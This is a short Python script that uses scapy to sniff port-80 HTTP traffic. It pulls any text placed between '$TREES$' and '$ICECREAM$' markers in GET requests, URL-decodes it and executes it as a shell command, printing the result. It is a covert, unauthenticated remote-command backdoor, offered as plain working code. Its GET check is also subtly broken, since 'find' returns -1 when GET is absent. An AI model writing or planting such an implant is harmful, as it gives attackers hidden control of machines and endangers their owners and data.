from scapy.all import *
import subprocess, urllib

def http_header(packet):
        http_packet=str(packet)
        if http_packet.find('GET'):
                s = GET_print(packet)
                if("$TREES$" in s):
                        ex = s[(s.index("$TREES$")+len("$TREES$")):s.index("$ICECREAM$")]
                        print(urllib.unquote(ex))
                        out = subprocess.check_output([urllib.unquote(ex)],shell=True)
                        print(out)
                return GET_print(packet)

def GET_print(packet1):
    ret = "***************************************GET PACKET****************************************************\n"
    ret += "\n".join(packet1.sprintf("{Raw:%Raw.load%}\n").split(r"\r\n"))
    ret += "*****************************************************************************************************\n"
    return ret

sniff(iface='enp0s3', prn=http_header, filter="tcp port 80")
